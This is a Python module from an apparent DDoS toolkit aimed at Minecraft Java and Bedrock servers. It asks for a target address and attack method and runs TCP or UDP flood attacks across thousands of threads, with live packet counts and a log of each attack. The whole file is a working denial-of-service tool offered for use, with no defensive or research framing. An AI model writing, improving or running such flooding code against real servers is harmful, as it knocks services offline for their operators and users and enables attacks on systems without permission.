#!/usr/bin/env python3
# Minecraft DDoS Attack Module with Real-time Live Logs

import socket
import threading
import random
import time
from modules.utils import pcolor, resolve, check_port
from modules.logger import save_log

def tcp_flood(ip, port, stop_event, stats):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.2)
            sock.connect((ip, port))
            sock.send(b"\x00" * 1024)
            sock.close()
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def udp_flood(ip, port, stop_event, stats):
    data = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(data, (ip, port))
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def minecraft_attack(edition):
    if edition == "java":
        default_port = 25565
        edition_name = "Java"
    else:
        default_port = 19132
        edition_name = "Bedrock"
    
    pcolor("b", f"\n[ MINECRAFT {edition_name} SERVER ATTACK ]\n")
    
    target = input("IP or Domain: ")
    
    if not target.replace('.', '').isdigit():
        ip = resolve(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    port = int(input(f"Port (default {default_port}): ") or default_port)
    
    if check_port(ip, port):
        pcolor("g", f"[+] Server is ONLINE")
    else:
        pcolor("r", f"[-] Server is OFFLINE")
        proceed = input("Continue anyway? (y/n): ")
        if proceed.lower() != 'y':
            return
    
    print("\n[ ATTACK METHODS ]")
    print("1. TCP Flood (Best for Java)")
    print("2. UDP Flood (Best for Bedrock)")
    method = input("Select (1-2): ")
    
    if method == "1":
        attack_func = tcp_flood
        method_name = "TCP_FLOOD"
    else:
        attack_func = udp_flood
        method_name = "UDP_FLOOD"
    
    threads = int(input("Threads (1000-10000, default 3000): ") or 3000)
    duration = int(input("Duration in seconds (default 60): ") or 60)
    
    print(f"\nTarget: {ip}:{port}")
    print(f"Method: {method_name}")
    print(f"Threads: {threads}")
    print(f"Duration: {duration}s")
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    stop_event = threading.Event()
    stats = {'packets': 0, 'errors': 0}
    
    for _ in range(threads):
        t = threading.Thread(target=attack_func, args=(ip, port, stop_event, stats))
        t.daemon = True
        t.start()
    
    pcolor("g", f"\n[!] ATTACK STARTED on {ip}:{port}")
    pcolor("y", "[!] Press Ctrl+C to stop\n")
    
    start_time = time.time()
    last_packets = 0
    last_errors = 0
    
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            pps = stats['packets'] - last_packets
            eps = stats['errors'] - last_errors
            
            last_packets = stats['packets']
            last_errors = stats['errors']
            
            bar_length = 30
            progress = int((elapsed / duration) * bar_length)
            bar = "█" * progress + "░" * (bar_length - progress)
            
            print(f"\r[{bar}] {elapsed}/{duration}s | "
                  f"✅ Packets: {stats['packets']:,} | "
                  f"❌ Errors: {stats['errors']:,} | "
                  f"⚡ {pps} p/s    ", end="")
            
            time.sleep(1)
        
        print()
        
    except KeyboardInterrupt:
        pcolor("y", "\n\n[!] Attack stopped by user")
    finally:
        stop_event.set()
        
        print("\n" + "="*60)
        pcolor("g", "[+] ATTACK FINISHED")
        print(f"[📊] Total packets sent: {stats['packets']:,}")
        print(f"[⚠️] Total errors: {stats['errors']:,}")
        print(f"[⏱️]  Actual duration: {int(time.time() - start_time)} seconds")
        
        total = stats['packets'] + stats['errors']
        if total > 0:
            success_rate = (stats['packets'] / total) * 100
            print(f"[📈] Success rate: {success_rate:.1f}%")
        
        print("="*60)
        
        save_log(ip, port, method_name, threads, duration, 
                 stats['packets'], stats['errors'])
        
        if stats['packets'] == 0:
            pcolor("r", "\n[-] No packets sent! Server may have protection.")
        else:
            pcolor("g", f"\n[+] Attack successful!")
    
    input("\nPress Enter...")
